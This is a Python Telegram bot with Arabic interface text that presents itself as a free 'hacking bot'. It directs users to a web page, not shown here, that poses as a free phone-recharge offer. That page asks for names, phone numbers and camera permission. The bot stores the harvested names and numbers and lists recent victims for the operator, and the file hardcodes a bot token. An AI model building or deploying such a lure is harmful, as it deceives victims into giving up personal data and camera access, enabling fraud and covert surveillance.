import os
import sqlite3
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler
from datetime import datetime

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# استبدل بـ API Token الخاص بك
TOKEN = "7968240446:AAH0dxhN5YOmpWzYpUGeyPjdq5NIm0peK18"
# استبدل باسم مستخدمك على GitHub
GITHUB_USERNAME = "mashalmazenmmm123"
GITHUB_PAGES_URL = f"https://github.io/mashalmazenmmm123/-camhack_m7_bot"

def init_database():
    """تهيئة قاعدة البيانات"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  name TEXT NOT NULL,
                  number TEXT NOT NULL,
                  timestamp TEXT NOT NULL)''')
    conn.commit()
    conn.close()

def save_user_data(name, number):
    """حفظ بيانات المستخدم"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO users (name, number, timestamp) VALUES (?, ?, ?)",
              (name, number, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

def get_user_stats():
    """الحصول على إحصائيات المستخدمين"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    
    # آخر 5 مستخدمين
    c.execute("SELECT name, number, timestamp FROM users ORDER BY id DESC LIMIT 5")
    recent_users = c.fetchall()
    conn.close()
    
    return count, recent_users

async def start(update: Update, context: CallbackContext) -> None:
    """معالجة أمر /start"""
    user = update.message.from_user
    
    keyboard = [
        [InlineKeyboardButton("🌐 فتح صفحة الاختراق", callback_data='open_web')],
        [InlineKeyboardButton("📊 عرض الإحصائيات", callback_data='show_stats')],
        [InlineKeyboardButton("📋 التعليمات", callback_data='show_help')],
        [InlineKeyboardButton("🆘 الدعم", callback_data='support')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = f"""
مرحباً {user.first_name}! 👋

😈 **بوت الاختراق المجاني ـ **

⚡ **المميزات:**
• اختراق حقيقي
• عملية سريعة وآمنة  
• دعم على مدار الساعة

📱 **للبدء، اضغط على:**
\"فتح صفحة الاختراق\"
    """
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

async def button_handler(update: Update, context: CallbackContext) -> None:
    """معالجة الضغط على الأزرار"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'open_web':
        web_text = f"""
🎉 **صفحة الاختراق جاهزة!**

🌐 **رابط الصفحة:**
{GITHUB_PAGES_URL}

📝 **طريقة الاستخدام:**
1. افتح الرابط في المتصفح
2. املأ اسمك ورقم هاتفك
3. اسمح بصلاحيات الكاميرا (مطلوب للتأكيد)
4. اضغط على "Recharge Now"
5. انتظر رسالة التأكيد

⚠️ **ملاحظة:** 
• الصفحة تحتوي على كاميرا ويب للتأكيد
• الشحن سيصل خلال 24 ساعة
        """
        await query.edit_message_text(web_text)
    
    elif query.data == 'show_stats':
        count, recent_users = get_user_stats()
        
        stats_text = f"""
📊 **إحصائيات البوت:**

👥 **إجمالي المستخدمين:** {count}
🕒 **آخر تحديث:** {datetime.now().strftime("%Y-%m-%d %H:%M")}

📋 **آخر 5 مستخدمين:**
"""
        for user in recent_users:
            stats_text += f"• {user[0]} - {user[1]} - {user[2]}\n"
        
        await query.edit_message_text(stats_text)
    
    elif query.data == 'show_help':
        help_text = """
📖 **دليل الاستخدام الكامل:**

1. **البدء:**
   - اضغط /start
   - اختر "فتح صفحة الشحن"

2. **على الصفحة:**
   - اكتب اسمك الكامل
   - أدخل رقم هاتفك
   - اسمح باستخدام الكاميرا
   - اضغط "Recharge Now"

3. **بعد الإرسال:**
   - انتظر صفحة التأكيد
   - سيصلك الشحن خلال 24 ساعة
   - شارك الرابط مع أصدقائك

❓ **أسئلة شائعة:**
- هل الخدمة مجانية؟ نعم! 100%
- متى يصل الشحن؟ خلال 24 ساعة
- هل أحتاج كاميرا؟ نعم، للتأكيد
        """
        await query.edit_message_text(help_text)
    
    elif query.data == 'support':
        support_text = """
🆘 **الدعم الفني:**

📧 للاستفسارات أو المشاكل:
• راسل المطور مباشرة
• أو أرسل رسالة هنا

⚡ **سيتم الرد خلال دقائق**

🔧 **أمور فنية:**
• إذا لم تفتح الصفحة، جرب متصفح مختلف
• تأكد من السماح للكاميرا
• جرب الرابط على جهاز كمبيوتر
        """
        await query.edit_message_text(support_text)

async def handle_message(update: Update, context: CallbackContext) -> None:
    """معالجة الرسائل النصية العادية"""
    text = update.message.text
    
    # إذا كان المستخدم يرسل بيانات
    if any(word in text.lower() for word in ['شحن', 'recharge', 'رقم', 'number']):
        await update.message.reply_text(
            f"📱 يرجى استخدام صفحة الويب لإدخال البيانات:\n\n"
            f"{GITHUB_PAGES_URL}\n\n"
            f"للعودة للقائمة الرئيسية: /start"
        )

async def stats_command(update: Update, context: CallbackContext):
    """أمر عرض الإحصائيات"""
    count, recent_users = get_user_stats()
    
    stats_text = f"""
📈 **إحصائيات البوت:**

👥 المستخدمين المسجلين: {count}
📅 آخر تحديث: {datetime.now().strftime("%Y-%m-%d %H:%M")}
    """
    
    await update.message.reply_text(stats_text)

def main():
    """الدالة الرئيسية"""
    # تهيئة قاعدة البيانات
    init_database()
    
    # إنشاء Application
    application = Application.builder().token(TOKEN).build()
    
    # إضافة المعالجات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # بدء البوت
    print("🎉 بوت الاختراق المجاني يعمل الآن!")
    print(f"🌐 رابط الصفحة: {GITHUB_PAGES_URL}")
    print("🤖 البوت جاهز لاستقبال الطلبات...")
    
    application.run_polling()

if __name__ == '__main__':
    main()
